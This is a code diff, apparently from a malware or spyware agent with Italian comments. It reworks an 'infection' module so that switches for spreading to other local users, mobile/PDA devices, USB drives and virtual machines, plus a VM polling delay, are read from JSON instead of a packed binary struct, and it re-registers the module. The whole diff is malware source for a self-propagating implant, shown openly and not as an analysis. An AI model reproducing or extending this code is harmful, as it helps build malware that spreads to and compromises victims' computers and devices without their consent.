@@ -22,17 +22,6 @@ BOOL infection_vm = FALSE;		// Deve infettare le VM?
 BOOL one_user_infected = FALSE; // Infetta solo un utente in una run
 DWORD vm_delay = VMW_AGENT_SLEEP_TIME; // Delay per il loop di polling sulle VM
 
-#pragma pack(4)
-typedef struct {
-	BOOL infection_spread;
-	BOOL infection_pda;
-	BOOL infection_usb;
-	DWORD version;
-	BOOL infection_vm;
-	DWORD vm_delay;
-} infection_conf_struct;
-#pragma pack()
-
 typedef struct _RAPIINIT {
   DWORD cbSize;
   HANDLE heRapiInit;
@@ -1185,33 +1174,26 @@ DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_PDAAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_PDAAgentInit(JSONObject elem)
 {
-	infection_conf_struct *infection_conf = (infection_conf_struct *)conf_ptr;
+	DWORD temp;
 
-	if (conf_ptr) { // Altrimenti di default sono a FALSE
-		infection_spread = infection_conf->infection_spread;
-		infection_pda = infection_conf->infection_pda;
-		infection_usb = infection_conf->infection_usb;
-		// Se e' la versione nuova della conf legge se infettare le vm
-		// e ogni quanto farlo (nella conf e' in secondi, ma a me serve in millisecondi)
-		if (infection_conf->version == 20110915) {
-			infection_vm = infection_conf->infection_vm;
-			vm_delay = infection_conf->vm_delay * 1000;
-		}
-	}
+	infection_spread = (BOOL) elem[L"local"]->AsBool();
+	infection_pda = (BOOL) elem[L"mobile"]->AsBool();
+	infection_usb = (BOOL) elem[L"usb"]->AsBool();
 
-	PM_PDAAgentStartStop(bStartFlag, TRUE);
+	temp = (DWORD) elem[L"vm"]->AsNumber();
+	if (temp!=0) {
+		infection_vm = TRUE;
+		vm_delay = temp;
+	} else 
+		infection_vm = FALSE;
+	
 	return 1;
 }
 
 
 void PM_PDAAgentRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_PDAAGENT, NULL, (BYTE *)PM_PDAAgentStartStop, (BYTE *)PM_PDAAgentInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_PDAAgentInit(NULL, FALSE);
+	AM_MonitorRegister(L"infection", PM_PDAAGENT, NULL, (BYTE *)PM_PDAAgentStartStop, (BYTE *)PM_PDAAgentInit, NULL);
 }
